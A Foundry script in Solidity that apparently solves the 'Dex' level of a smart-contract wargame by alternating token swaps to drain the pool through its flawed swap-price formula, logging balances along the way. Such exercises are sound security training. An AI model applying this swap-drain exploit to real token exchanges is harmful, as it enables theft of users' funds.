// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/levels/22-Dex/Dex.sol";

contract ExploitScript is Script {
    Dex level22 = Dex(payable(0xd5382171953d2c195BEAE5E1bcF6c0A6E9Eb18Ff));

    function run() public {
        vm.startBroadcast();
        address mywallet = 0x7A30be98aFCeA6cf186751546af0C563e1e8Ae08;
        level22.approve(address(level22), 500);
        address token1 = level22.token1();
        address token2 = level22.token2();
        console.log(level22.getSwapPrice(token1,token2,10));

        level22.swap(token1, token2, 10);
        console.log("my token 1:",level22.balanceOf(token1, address(mywallet)));
        console.log("my token 2:",level22.balanceOf(token2, address(mywallet)));
        level22.swap(token2, token1, 20);
        console.log("my token 1:",level22.balanceOf(token1, address(mywallet)));
        console.log("my token 2:",level22.balanceOf(token2, address(mywallet)));
        level22.swap(token1, token2, 24);
        console.log("my token 1:",level22.balanceOf(token1, address(mywallet)));
        console.log("my token 2:",level22.balanceOf(token2, address(mywallet)));
        level22.swap(token2, token1, 30);
        console.log("my token 1:",level22.balanceOf(token1, address(mywallet)));
        console.log("my token 2:",level22.balanceOf(token2, address(mywallet)));
        level22.swap(token1, token2, 41);
        console.log("Contract token 1:",level22.balanceOf(token1, address(level22)));
        console.log("Contract token 2:",level22.balanceOf(token2, address(level22)));
        console.log("my token 1:",level22.balanceOf(token1, address(mywallet)));
        console.log("my token 2:",level22.balanceOf(token2, address(mywallet)));
        level22.swap(token2, token1, 45);
        console.log("Contract token 1:",level22.balanceOf(token1, address(level22)));
        console.log("Contract token 2:",level22.balanceOf(token2, address(level22)));
        console.log("my token 1:",level22.balanceOf(token1, address(mywallet)));
        console.log("my token 2:",level22.balanceOf(token2, address(mywallet)));


        vm.stopBroadcast();
    }
}

